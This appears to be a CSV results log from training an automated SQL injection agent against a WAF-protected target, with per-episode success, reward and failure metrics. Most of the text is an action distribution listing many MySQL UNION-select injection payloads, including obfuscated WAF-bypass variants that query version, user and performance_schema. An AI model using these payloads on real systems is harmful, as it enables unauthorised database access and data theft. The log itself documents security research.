Episode,Success_Rate,Average_Queries,Average_Reward,Average_Time,Failures_Max_Step,Failures_WAF_Block,Failures_Syntax_Error,Failures_Other,Action_Distribution
1000,98.90,18.94,-159.71,16.7072,11,0,0,0,"{' and 1=2 union select 1,user(),3,4,5 --': 125076, ' and 1=2 union select version(),user() --': 121439, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c/**/join/**/(Select/**/4)d%23': 113939, "" 'union select 1,2--"": 105709, "" 'union select 1,2,3--"": 111851, "" ' and 1=2 union select 1,version() --"": 133673, "" ' and 1=2 union select version(),user(),3,4 --"": 122916, ' and 1=2 union select 1,version(),3,4 --': 123113, "" 'union select 1,2,3,4--"": 124027, 'bmw%27Unionon/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 107797, "" 'union select 1,version(),3 --"": 126505, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c%23': 115954, "" ' and 1=2 union select version(),user(),3,4,5 --"": 124966, "" 'union select 1--"": 119831, ' union select version(),user(),3,4 --': 113706, 'bmw%27Unionon/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c/**/join/**/(Select/**/5)d%23': 117379, ' and 1=2 union select 1,2,3--': 128071, "" 'union select version(),user(),3,4,5 --"": 116534, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 112412, 'bmw%27Unionon/**/Select/**/VARIABLE_VALUE/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 106190, ' union select 1,2--': 115606, ' and 1=2 union select 1,user(),3,4 --': 115976, "" 'union select 1,version() --"": 112585, 'bmw%27Union/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 125147, ' and 1=2 union select 1,version(),3 --': 151556, ' and 1=2 union select 1,user(),3 --': 191923, ' union select 1,user(),3 --': 122551, ' and 1=2 union select 1,2,3,4--': 119728, ' and 1=2 union select 1--': 108560, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c%23': 117235, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 110536, "" 'union select 1,version(),3,4,5 --"": 126736, "" 'union select 1,user(),3,4,5 --"": 115333, ' and 1=2 union select version(),user(),3 --': 148490, "" ' and 1=2 union select 1,2,3,4,5--"": 120679, "" 'union select version(),user(),3 --"": 112356, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/5)c%23': 120916, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 123237, "" 'union select 1,user() --"": 116581, "" ' and 1=2 union select version(),user(),3 --"": 130973, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 117084, "" 'union select version(),user() --"": 113223, ' union select 1,2,3,4,5--': 108793, "" ' and 1=2 union select 1,user(),3,4,5 --"": 103876, ' and 1=2 union select 1,version(),3,4,5 --': 108338, ' and 1=2 union select 1,2,3,4,5--': 129574, "" ' and 1=2 union select version(),user() --"": 123285, ' union select 1,user(),3,4,5 --': 111039, ' and 1=2 union select 1,user() --': 117002, ' union select version(),user() --': 119074, "" 'union select 1,user(),3,4 --"": 120691, 'bmw%27Unionon/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 120045, "" ' and 1=2 union select 1,version(),3,4 --"": 96092, ' union select version(),user(),3,4,5 --': 128972, ' union select 1--': 114284, "" 'union select 1,user(),3 --"": 114400, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c%23': 109410, "" ' and 1=2 union select 1--"": 122150, ' union select 1,user(),3,4 --': 105303, 'bmw%27Union/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c/**/join/**/(Select/**/5)d%23': 120913, ' union select 1,version(),3,4 --': 134647, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 130305, "" ' and 1=2 union select 1,2,3,4--"": 124763, "" 'union select 1,2,3,4,5--"": 105338, ' union select version(),user(),3 --': 103094, ' union select 1,version(),3 --': 121577, ' union select 1,2,3--': 129362, "" ' and 1=2 union select 1,user(),3 --"": 112987, "" 'union select version(),user(),3,4 --"": 115578, ' union select 1,version() --': 126334, "" ' and 1=2 union select 1,2,3--"": 111642, 'bmw%27Union/**/Select/**/VARIABLE_VALUE/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 126078, "" ' and 1=2 union select 1,user() --"": 116182, "" ' and 1=2 union select 1,version(),3 --"": 110427, 'bmw%27Union/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 114466, "" ' and 1=2 union select 1,2--"": 124634, ' union select 1,2,3,4--': 119184, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/5)c%23': 138577, "" 'union select 1,version(),3,4 --"": 97342, ' and 1=2 union select version(),user(),3,4 --': 127337, ' union select 1,user() --': 108541, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c%23': 109750, ' and 1=2 union select 1,version() --': 114700, ' and 1=2 union select version(),user(),3,4,5 --': 106564, ' and 1=2 union select 1,2--': 101280, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c/**/join/**/(Select/**/4)d%23': 113292, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c/**/join/**/(Select/**/4)d%23': 110897, "" ' and 1=2 union select 1,version(),3,4,5 --"": 122392, ' union select 1,version(),3,4,5 --': 114944, "" ' and 1=2 union select 1,user(),3,4 --"": 101035, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 118364}"
2000,100.00,10.45,-74.49,8.6944,0,0,0,0,"{' and 1=2 union select 1,user(),3,4,5 --': 397559, ' and 1=2 union select version(),user() --': 387271, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c/**/join/**/(Select/**/4)d%23': 374028, "" 'union select 1,2--"": 359229, "" 'union select 1,2,3--"": 353105, "" ' and 1=2 union select 1,version() --"": 418229, "" ' and 1=2 union select version(),user(),3,4 --"": 394396, ' and 1=2 union select 1,version(),3,4 --': 390546, "" 'union select 1,2,3,4--"": 417556, 'bmw%27Unionon/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 352767, "" 'union select 1,version(),3 --"": 386115, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c%23': 393116, "" ' and 1=2 union select version(),user(),3,4,5 --"": 390675, "" 'union select 1--"": 397979, ' union select version(),user(),3,4 --': 366776, 'bmw%27Unionon/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c/**/join/**/(Select/**/5)d%23': 377865, ' and 1=2 union select 1,2,3--': 402717, "" 'union select version(),user(),3,4,5 --"": 401698, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 372445, 'bmw%27Unionon/**/Select/**/VARIABLE_VALUE/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 363737, ' union select 1,2--': 375739, ' and 1=2 union select 1,user(),3,4 --': 363375, "" 'union select 1,version() --"": 365765, 'bmw%27Union/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 406464, ' and 1=2 union select 1,version(),3 --': 735929, ' and 1=2 union select 1,user(),3 --': 679182, ' union select 1,user(),3 --': 379640, ' and 1=2 union select 1,2,3,4--': 394440, ' and 1=2 union select 1--': 344177, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c%23': 385675, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 362792, "" 'union select 1,version(),3,4,5 --"": 389659, "" 'union select 1,user(),3,4,5 --"": 386983, ' and 1=2 union select version(),user(),3 --': 567247, "" ' and 1=2 union select 1,2,3,4,5--"": 392223, "" 'union select version(),user(),3 --"": 373157, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/5)c%23': 377053, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 388163, "" 'union select 1,user() --"": 382966, "" ' and 1=2 union select version(),user(),3 --"": 417332, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 368057, "" 'union select version(),user() --"": 384862, ' union select 1,2,3,4,5--': 350081, "" ' and 1=2 union select 1,user(),3,4,5 --"": 350746, ' and 1=2 union select 1,version(),3,4,5 --': 349434, ' and 1=2 union select 1,2,3,4,5--': 398656, "" ' and 1=2 union select version(),user() --"": 384354, ' union select 1,user(),3,4,5 --': 362685, ' and 1=2 union select 1,user() --': 375761, ' union select version(),user() --': 385321, "" 'union select 1,user(),3,4 --"": 392956, 'bmw%27Unionon/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 391457, "" ' and 1=2 union select 1,version(),3,4 --"": 329429, ' union select version(),user(),3,4,5 --': 432448, ' union select 1--': 369572, "" 'union select 1,user(),3 --"": 378543, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c%23': 348585, "" ' and 1=2 union select 1--"": 387142, ' union select 1,user(),3,4 --': 344717, 'bmw%27Union/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c/**/join/**/(Select/**/5)d%23': 389124, ' union select 1,version(),3,4 --': 433992, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23': 415599, "" ' and 1=2 union select 1,2,3,4--"": 412839, "" 'union select 1,2,3,4,5--"": 373983, ' union select version(),user(),3 --': 349313, ' union select 1,version(),3 --': 399801, ' union select 1,2,3--': 403404, "" ' and 1=2 union select 1,user(),3 --"": 357478, "" 'union select version(),user(),3,4 --"": 384637, ' union select 1,version() --': 402669, "" ' and 1=2 union select 1,2,3--"": 369333, 'bmw%27Union/**/Select/**/VARIABLE_VALUE/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 407484, "" ' and 1=2 union select 1,user() --"": 382853, "" ' and 1=2 union select 1,version(),3 --"": 364024, 'bmw%27Union/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 382379, "" ' and 1=2 union select 1,2--"": 383440, ' union select 1,2,3,4--': 397394, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/5)c%23': 434209, "" 'union select 1,version(),3,4 --"": 342847, ' and 1=2 union select version(),user(),3,4 --': 395897, ' union select 1,user() --': 353443, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c%23': 364948, ' and 1=2 union select 1,version() --': 347139, ' and 1=2 union select version(),user(),3,4,5 --': 352296, ' and 1=2 union select 1,2--': 338363, 'bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c/**/join/**/(Select/**/4)d%23': 385130, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c/**/join/**/(Select/**/4)d%23': 356946, "" ' and 1=2 union select 1,version(),3,4,5 --"": 402359, ' union select 1,version(),3,4,5 --': 376024, "" ' and 1=2 union select 1,user(),3,4 --"": 336123, 'bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23': 373373}"
